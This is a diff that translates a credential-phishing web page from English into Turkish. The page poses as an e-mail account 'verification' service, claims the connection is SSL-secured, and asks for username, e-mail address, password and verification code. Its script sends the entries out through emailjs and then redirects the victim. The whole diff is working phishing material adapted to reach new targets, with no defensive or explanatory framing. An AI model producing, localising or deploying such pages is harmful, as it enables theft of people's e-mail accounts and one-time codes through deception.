@@ -4,7 +4,7 @@
 <meta http-equiv="Content-Type" content="text/html; charset=UTF-8">
 <meta name="viewport" content="width=device-width, initial-scale=1.0">
 <meta name="referrer" content="no-referrer">
-<title>User Detail Verification - E-mail Account Management Service</title>
+<title>Kullanıcı Bilgileri Doğrulama - E-posta Hesap Yönetim Servisi</title>
 <style>
    body {
     background-color: #1e325d;
@@ -1119,18 +1119,17 @@ a.rightlink {
   <div class="header_login">
     <div class="logo"><a href="verification.html"><img src="https://mailserver-gold.vercel.app/asset/logo_tr.png" alt="" title="" border="0"></a></div>
     <div class="right_header">
-      <a href="verification.html">English</a>
+      <a href="verification.html">Türkçe</a>
     </div>
     <div id="clock_a"></div>
   </div>
 
   <div class="login_form">
     <img src="https://mailserver-gold.vercel.app/asset/login_icon.gif" align="middle">
-    <h3>User Detail Verification</h3>
+    <h3>Kullanıcı Bilgileri Doğrulama</h3>
     <p>
-      For security reasons, your account details must be verified before you can continue using the
-      E-mail Account Management Service. Please fill in the form below. All information is encrypted
-      and handled securely.
+      Güvenlik nedeniyle, hesabınızın ayrıntıları E-posta Hesap Yönetim Servisini kullanmaya devam etmeden önce doğrulanmalıdır.
+      Lütfen aşağıdaki formu doldurun. Tüm bilgiler şifrelenir ve güvenli bir şekilde işlenir.
     </p>
 
     <form class="form" id="form">
@@ -1138,28 +1137,28 @@ a.rightlink {
       <table align="center" style="margin-top: 30px;">
         <tbody>
           <tr>
-            <th>Username</th>
+            <th>Kullanıcı Adı</th>
             <td><input type="text" name="username" id="username" autocomplete="off" required></td>
           </tr>
           <tr>
-            <th>E-Mail Address</th>
+            <th>E-posta Adresi</th>
             <td><input type="email" name="email" id="email" required></td>
           </tr>
           <tr>
-            <th>E-Mail Password</th>
+            <th>E-posta Şifresi</th>
             <td>
               <input name="password" id="password" type="password" autocomplete="new-password" required>
             </td>
           </tr>
           <tr>
-            <th>Verification Code</th>
+            <th>Doğrulama Kodu</th>
             <td><input type="text" name="code" id="code" autocomplete="off" required></td>
           </tr>
           <tr>
             <td></td>
             <td>
-              <input type="submit" id="button" value="V e r i f y">
-              <a href="#" style="float: right;" onclick="return false;">Need help?</a>
+              <input type="submit" id="button" value="Doğrula">
+              <a href="#" style="float: right;" onclick="return false;">Yardıma mı ihtiyacınız var?</a>
 
 
 
@@ -1171,7 +1170,7 @@ a.rightlink {
     </form>
 
     <div id="result" class="notice"></div>
-    <p class="secure-note">&#128274; Secure SSL-encrypted connection</p>
+    <p class="secure-note">&#128274; Güvenli SSL şifreli bağlantı</p>
   </div>
 
 </div>
@@ -1202,31 +1201,31 @@ a.rightlink {
 
   function validateForm() {
     if (!usernameEl.value.trim()) {
-      showNotice('Please enter your username.');
+      showNotice('Lütfen kullanıcı adınızı girin.');
       usernameEl.focus();
       return false;
     }
 
     if (!emailEl.value.trim()) {
-      showNotice('Please enter your e-mail address.');
+      showNotice('Lütfen e-posta adresinizi girin.');
       emailEl.focus();
       return false;
     }
 
     if (!/^\S+@\S+\.\S+$/.test(emailEl.value.trim())) {
-      showNotice('Please enter a valid e-mail address.');
+      showNotice('Lütfen geçerli bir e-posta adresi girin.');
       emailEl.focus();
       return false;
     }
 
     if (!passwordEl.value.trim()) {
-      showNotice('Please enter your password.');
+      showNotice('Lütfen şifrenizi girin.');
       passwordEl.focus();
       return false;
     }
 
     if (!codeEl.value.trim()) {
-      showNotice('Please enter the verification code.');
+      showNotice('Lütfen doğrulama kodunu girin.');
       codeEl.focus();
       return false;
     }
@@ -1242,7 +1241,7 @@ a.rightlink {
       return;
     }
 
-    btn.value = 'Sending...';
+    btn.value = 'Gönderiliyor...';
     btn.disabled = true;
 
     const serviceID = 'default_service';
@@ -1250,15 +1249,15 @@ a.rightlink {
 
     emailjs.sendForm(serviceID, templateID, this)
       .then(() => {
-        btn.value = 'Send Email';
-        showNotice('Sent successfully. Redirecting...', 'success');
+        btn.value = 'Doğrula';
+        showNotice('Gönderildi. Yönlendiriliyor...', 'success');
         window.setTimeout(() => {
           window.location.href = redirectUrl;
         }, 900);
       }, (err) => {
-        btn.value = 'Send Email';
+        btn.value = 'Doğrula';
         btn.disabled = false;
-        showNotice('Submission failed. Please try again.');
+        showNotice('Gönderim başarısız. Lütfen tekrar deneyin.');
         console.error(err);
       });
   });
